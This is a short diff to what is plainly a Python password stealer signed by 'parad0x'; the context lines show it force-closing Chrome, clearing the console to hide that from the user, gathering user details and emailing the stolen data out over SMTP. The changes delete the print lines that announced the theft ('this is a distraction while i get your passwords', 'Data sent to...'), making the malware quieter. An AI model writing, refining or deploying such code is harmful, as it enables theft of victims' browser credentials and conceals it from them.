@@ -1,4 +1,4 @@
-// madeby parad0x 20/10/19 8:48pm
+## madeby parad0x 20/10/19 8:48pm ##
 
 #imports
 import os
@@ -19,9 +19,6 @@ browserExe = "chrome.exe"
 os.system("taskkill /f /im "+browserExe)
 # clears console, making it invisible to user that we killed chrome's process
 os.system("cls")
-
-print("Heyyyyyy, this is a distraction while i get your passwords ;))")
-time.sleep(1)
 
 # gather user info
 datetime = time.ctime(time.time())
@@ -89,9 +86,6 @@ def send_stuff():
     text = message.as_string()
     session.sendmail(sender_address, receiver_address, text)
     session.quit()
-
-    print("Data sent to " + receiver_address + "!!")
-
 
 
 if __name__ == '__main__':
